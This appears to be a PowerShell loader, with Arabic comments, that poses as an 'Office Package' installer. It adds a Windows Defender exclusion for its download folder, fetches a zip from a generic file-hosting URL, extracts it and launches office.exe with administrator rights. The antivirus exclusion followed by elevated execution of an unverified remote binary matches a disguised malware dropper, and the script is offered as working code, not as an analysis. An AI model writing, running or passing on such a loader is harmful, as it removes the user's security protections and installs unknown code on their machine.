# ============================================================================================== #
Write-Host "Downloading Office Package, Please Wait..." -ForegroundColor Cyan
# ============================================================================================== #
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\Office"
$Url = "https://file.garden/an5JdIrGtwwEoiH6/office/office.zip"
$TargetDir = "$env:USERPROFILE\Downloads\office"
$ZipDest = "$TargetDir\office.zip"
$ExeDest = "$TargetDir\office.exe"

# إنشاء مجلد الوجهة إذا لم يكن موجوداً
if (-not (Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

try {
    # تنزيل الملف المضغوط
    Invoke-RestMethod -Uri $Url -OutFile $ZipDest

    # التحقق من اكتمال التنزيل
    if (Test-Path $ZipDest) {
        Write-Host "Downloaded Successfully." -ForegroundColor Green
        Write-Host "Extracting files..." -ForegroundColor Cyan

        # فك الضغط واستبدال الملفات
        Expand-Archive -Path $ZipDest -DestinationPath $TargetDir -Force

        # التحقق من وجود الملف التنفيذي وتشغيله بصلاحيات المسؤول
        if (Test-Path $ExeDest) {
            Write-Host "Running office.exe..." -ForegroundColor Green
            Start-Process -FilePath $ExeDest -WorkingDirectory $TargetDir -Verb RunAs
        } else {
            Write-Host "office.exe not found after extraction!" -ForegroundColor Red
        }
    } else {
        Write-Host "Download Failed! File not found." -ForegroundColor Red
    }
} catch {
    Write-Host "An error occurred: $_" -ForegroundColor Red
}
# ============================================================================================== #
